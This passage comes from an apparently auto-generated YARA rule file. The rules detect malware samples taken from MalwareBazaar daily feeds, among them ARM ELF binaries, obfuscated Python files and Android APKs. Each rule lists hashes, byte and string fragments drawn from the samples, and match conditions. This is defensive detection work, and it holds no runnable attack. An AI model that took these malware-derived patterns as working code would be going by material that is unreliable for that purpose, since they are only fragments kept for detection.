      $s20 = "Bad font file format" fullword ascii /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _0577e1edccd9e6ac82ac314e3d2fec9b3c8cfa98f41d89f4bc193360e0402f8b_1389bbd1bc3329495a992d9b00c08523851a52933a76354a81bb408360_3 {
   meta:
      description = "evidences - from files 0577e1edccd9e6ac82ac314e3d2fec9b3c8cfa98f41d89f4bc193360e0402f8b.unknown, 1389bbd1bc3329495a992d9b00c08523851a52933a76354a81bb408360100d9b.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "0577e1edccd9e6ac82ac314e3d2fec9b3c8cfa98f41d89f4bc193360e0402f8b"
      hash2 = "1389bbd1bc3329495a992d9b00c08523851a52933a76354a81bb408360100d9b"
   strings:
      $s1 = "xE1\\x08\\x00\\x9F\\xE5\"\"\\x02\\x30\\xA0\\xE1\\x0C\\x20\\xA0\\xE1\\x74\\x00\\x00\\xEA\\x03\\x00\\x90\\x00\\x04\\xE0\\x2D\\xE5" ascii
      $s2 = "8\\x00\\x9F\\xE5\"\"\\x02\\x30\\xA0\\xE1\\x0C\\x20\\xA0\\xE1\\x8C\\x00\\x00\\xEA\\x05\\x00\\x90\\x00\\x04\\xE0\\x2D\\xE5\\x0C\\x" ascii
      $s3 = "x2D\\xE9\\x74\\x41\\x9F\\xE5\"\"\\x94\\xD0\\x4D\\xE2\\x00\\x00\\x00\\xEA\\x01\\x40\\x84\\xE2\\x00\\x60\\xD4\\xE5\\x00\\x00\\x56" ascii
      $s4 = "0\\xE1\\xAE\\xFF\\xFF\\xEB\\x04\\x00\\x50\\xE1\"\"\\x03\\x00\\xA0\\x13\\x92\\xFF\\xFF\\x1B\\x06\\x40\\xA0\\xE1\\x93\\x10\\x8D\\x" ascii
      $s5 = "0\\x54\\xE1\\xF3\\xFF\\xFF\\x1A\\x0D\\x10\\xA0\\xE1\"\"\\x80\\x20\\xA0\\xE3\\x05\\x00\\xA0\\xE1\\xA1\\xFF\\xFF\\xEB\\x00\\x20\\x" ascii
      $s6 = "xE3\\x00\\x40\\xA0\\xE1\\x70\\x80\\xBD\\x98\\x03\\x00\\x00\\xEB\"\"\\x00\\x30\\x64\\xE2\\x00\\x30\\x80\\xE5\\x00\\x00\\xE0\\xE3" ascii
      $s7 = "1\\x9F\\xE5\\x58\\x11\\x9F\\xE5\"\"\\x06\\x20\\xA0\\xE3\\x01\\x00\\xA0\\xE3\\x04\\x80\\x63\\xE0\\xD9\\xFF\\xFF\\xEB\\x02\\x40\\x" ascii
      $s8 = "x30\\xA0\\xE3\\x8E\\x10\\xA0\\xE3\"\"\\x35\\x20\\xA0\\xE3\\xB9\\x00\\xA0\\xE3\\x83\\xC0\\xCD\\xE5\\x80\\x40\\xCD\\xE5\\x81\\x60" ascii
      $s9 = "D\\xE8\\x01\\x10\\xA0\\xE3\"\"\\x0D\\x20\\xA0\\xE1\\x08\\x00\\x9F\\xE5\\x6C\\x00\\x00\\xEB\\x0C\\xD0\\x8D\\xE2\\x00\\x80\\xBD\\x" ascii
      $s10 = "xE5\\x04\\x20\\xA0\\xE3\\xB5\\xFF\\xFF\\xEB\"\"\\x00\\x00\\x64\\xE2\\x9A\\xFF\\xFF\\xEB\\x28\\x40\\x88\\xE2\\x05\\x00\\xA0\\xE1" ascii
      $s11 = "x81\\xE1\"\"\\xFF\\x30\\x03\\xE2\\x02\\x24\\xA0\\xE1\\x03\\x10\\x81\\xE1\\xFF\\x2C\\x02\\xE2\\x01\\x20\\x82\\xE1\\xFF\\x3C\\x02" ascii
      $s12 = "x10\\xA0\\xE1\\x07\\x00\\xA0\\xE1\\x01\\x00\\x00\\xDA\"\"\\x94\\xFF\\xFF\\xEB\\xF4\\xFF\\xFF\\xEA\\x05\\x00\\xA0\\xE1\\x7C\\xFF" ascii
      $s13 = "B\\x05\\x00\\xA0\\xE1\\x80\\x10\\x8D\\xE2\"\"\\x10\\x20\\xA0\\xE3\\xB1\\xFF\\xFF\\xEB\\x00\\x40\\x50\\xE2\\x05\\x00\\x00\\xAA\\x" ascii
      $s14 = "5\\xFF\\xFF\\xEB\\x1C\\x11\\x9F\\xE5\"\"\\x84\\x00\\x8D\\xE5\\x18\\x21\\x9F\\xE5\\x18\\x01\\x9F\\xE5\\xB8\\xFF\\xFF\\xEB\\x01\\x" ascii
      $s15 = "x03\\x10\\xA0\\xE3\"\"\\x0D\\x20\\xA0\\xE1\\x08\\x00\\x9F\\xE5\\x84\\x00\\x00\\xEB\\x0C\\xD0\\x8D\\xE2\\x00\\x80\\xBD\\xE8\\x66" ascii
      $s16 = "4\\xA0\\xE1\"\"\\x20\\x04\\xA0\\xE1\\x22\\x0C\\x80\\xE1\\x02\\x3C\\x83\\xE1\\x00\\x00\\x83\\xE1\\x0E\\xF0\\xA0\\xE1\\x00\\x10\\x" ascii
      $s17 = "\"\\x7F\\x45\\x4C\\x46\\x01\\x01\\x01\\x61\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x28\\x00\\x01\\x00\\x00\\x00\\x1C" ascii
      $s18 = "A\\xFF\\xFF\\xEB\\x38\\x10\\x9F\\xE5\\x04\\x20\\xA0\\xE3\"\"\\x01\\x00\\xA0\\xE3\\x8B\\xFF\\xFF\\xEB\\x05\\x00\\xA0\\xE3\\x70\\x" ascii
      $s19 = "1\\x00\\x10\\xA0\\xE1\"\"\\x08\\x00\\x9F\\xE5\\x02\\x30\\xA0\\xE1\\x0C\\x20\\xA0\\xE1\\x7B\\x00\\x00\\xEA\\x04\\x00\\x90\\x00\\x" ascii
      $s20 = "xA0\\xE1\\xAD\\xFF\\xFF\\xEB\\x01\\x00\\x50\\xE3\"\"\\x04\\x00\\xA0\\xE3\\x8A\\xFF\\xFF\\x1B\\x93\\x30\\xDD\\xE5\\x04\\x44\\x83" ascii
   condition:
      ( uint16(0) == 0x5c22 and filesize < 10KB and ( 8 of them )
      ) or ( all of them )
}

rule _042da0fae4689b607361f84c054f4dba89b097d85d5323a0fd524648b5db8aba_15902b0e95f2e8fcb4a56e332a309385996aa394b6eccb3fc1c18e1574_4 {
   meta:
      description = "evidences - from files 042da0fae4689b607361f84c054f4dba89b097d85d5323a0fd524648b5db8aba.py, 15902b0e95f2e8fcb4a56e332a309385996aa394b6eccb3fc1c18e1574cfaed9.py, 8f5719332a6afeca686071972a253a922c58d7da3a609d4e196c9ec8e5cd342d.py, 98b8285720695a510f4b0cce46e4e85742f107ab8a811a67a78dd557084181a5.py"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "042da0fae4689b607361f84c054f4dba89b097d85d5323a0fd524648b5db8aba"
      hash2 = "15902b0e95f2e8fcb4a56e332a309385996aa394b6eccb3fc1c18e1574cfaed9"
      hash3 = "8f5719332a6afeca686071972a253a922c58d7da3a609d4e196c9ec8e5cd342d"
      hash4 = "98b8285720695a510f4b0cce46e4e85742f107ab8a811a67a78dd557084181a5"
   strings:
      $s1 = "returnc" fullword ascii
      $s2 = "Kramer.__decode__" fullword ascii
      $s3 = "decode)" fullword ascii
      $s4 = "__decode__z" fullword ascii
      $s5 = "__init__z" fullword ascii
      $s6 = "__qualname__" fullword ascii
      $s7 = "_sparkleN)" fullword ascii
      $s8 = "Kramer" fullword ascii /* Goodware String - occured 1 times */
      $s9 = "Kramer.__init__" fullword ascii
      $s10 = "z4Kramer.__init__.<locals>.<lambda>.<locals>.<genexpr>" fullword ascii
      $s11 = "<genexpr>z4Kramer.__init__.<locals>.<lambda>.<locals>.<genexpr>" fullword ascii
      $s12 = "z!Kramer.__init__.<locals>.<lambda>" fullword ascii
      $s13 = "<lambda>z!Kramer.__init__.<locals>.<lambda>" fullword ascii
      $s14 = "split)" fullword ascii
      $s15 = "0123456789c" ascii
      $s16 = "``` `r" fullword ascii
   condition:
      ( uint16(0) == 0x0dcb and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _4ee8ee83ac78c71e084cb42d28158b8fee1ec32b580dd9c9decd89f6579d49bf_f384e1c2ac627fdfabaef3401c1b457e2b08830eaf91a6c544328f1f81_5 {
   meta:
      description = "evidences - from files 4ee8ee83ac78c71e084cb42d28158b8fee1ec32b580dd9c9decd89f6579d49bf.apk, f384e1c2ac627fdfabaef3401c1b457e2b08830eaf91a6c544328f1f81bfd799.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "4ee8ee83ac78c71e084cb42d28158b8fee1ec32b580dd9c9decd89f6579d49bf"
      hash2 = "f384e1c2ac627fdfabaef3401c1b457e2b08830eaf91a6c544328f1f81bfd799"
   strings:
      $s1 = "resources.arsc" fullword ascii
      $s2 = "res/drawable-xhdpi-v4/default_image.png" fullword ascii
      $s3 = "res/drawable-xhdpi-v4/app_icon.png" fullword ascii
      $s4 = "res/layout/main.xml" fullword ascii
      $s5 = "''res/drawable-xhdpi-v4/default_image.png" fullword ascii
      $s6 = "\"\"res/drawable-xhdpi-v4/app_icon.png" fullword ascii
      $s7 = "linear1" fullword ascii
      $s8 = "NoActionBar" fullword ascii
      $s9 = "NoStatusBar" fullword ascii
      $s10 = "default_image" fullword ascii
      $s11 = "res/layout/main.xmlPK" fullword ascii
      $s12 = "app_icon" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _9327933f4ce2d9485e98192cffc35d127e85bf0db77dc37ba595305760e31611_effdd3d663e7ae08ee64667d92e2866d7996db3d213458dc5837f6c732_6 {
   meta:
      description = "evidences - from files 9327933f4ce2d9485e98192cffc35d127e85bf0db77dc37ba595305760e31611.unknown, effdd3d663e7ae08ee64667d92e2866d7996db3d213458dc5837f6c732ac1388.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "9327933f4ce2d9485e98192cffc35d127e85bf0db77dc37ba595305760e31611"
      hash2 = "effdd3d663e7ae08ee64667d92e2866d7996db3d213458dc5837f6c732ac1388"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s3 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s4 = "bAAAAAAAAA" ascii /* base64 encoded string 'l      ' */
      $s5 = "AAAAAAAAAAAAAAABAAAAAAAAEAAAEAAAAAABAAABAA" ascii
      $s6 = "BAAAAAAAAA" ascii
      $s7 = "AAAAAAAAAA8AAAE" ascii
      $s8 = "EAAACCAAAAAAAAAAAAAAACAAA" ascii
      $s9 = "AAACAAAAAAAAAAAAAAAAAA" ascii
      $s10 = "AAAAAAAAAAAAAA" ascii /* Goodware String - occured 3 times */
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* Goodware String - occured 3 times */
      $s12 = "05CAAAAAAAAAAAAAA" ascii
   condition:
      ( ( uint16(0) == 0x3d3d or uint16(0) == 0x4141 ) and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d_4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce944310_7 {
   meta:
      description = "evidences - from files 40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d.apk, 4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce9443109dd39b.apk, 4ee8ee83ac78c71e084cb42d28158b8fee1ec32b580dd9c9decd89f6579d49bf.apk, f384e1c2ac627fdfabaef3401c1b457e2b08830eaf91a6c544328f1f81bfd799.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d"
      hash2 = "4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce9443109dd39b"
      hash3 = "4ee8ee83ac78c71e084cb42d28158b8fee1ec32b580dd9c9decd89f6579d49bf"
      hash4 = "f384e1c2ac627fdfabaef3401c1b457e2b08830eaf91a6c544328f1f81bfd799"
   strings:
      $s1 = "colorPrimaryDark" fullword ascii
      $s2 = "colorControlHighlight" fullword ascii
      $s3 = "colorAccent" fullword ascii
      $s4 = "colorControlNormal" fullword ascii
      $s5 = "colorPrimary" fullword ascii
      $s6 = "classes.dexPK" fullword ascii
      $s7 = "META-INF/MANIFEST.MFPK" fullword ascii /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x4b50 and filesize < 17000KB and ( all of them )
      ) or ( all of them )
}

rule _40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d_4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce944310_8 {
   meta:
      description = "evidences - from files 40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d.apk, 4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce9443109dd39b.apk, f384e1c2ac627fdfabaef3401c1b457e2b08830eaf91a6c544328f1f81bfd799.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d"
      hash2 = "4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce9443109dd39b"
      hash3 = "f384e1c2ac627fdfabaef3401c1b457e2b08830eaf91a6c544328f1f81bfd799"
   strings:
      $s1 = "AndroidManifest.xmlPK" fullword ascii
      $s2 = "META-INF/CERT.SFPK" fullword ascii
      $s3 = "META-INF/CERT.SF" fullword ascii
      $s4 = "META-INF/CERT.RSAPK" fullword ascii
      $s5 = "9-hI+Z" fullword ascii
      $s6 = "E)FqJP" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 17000KB and ( all of them )
      ) or ( all of them )
}
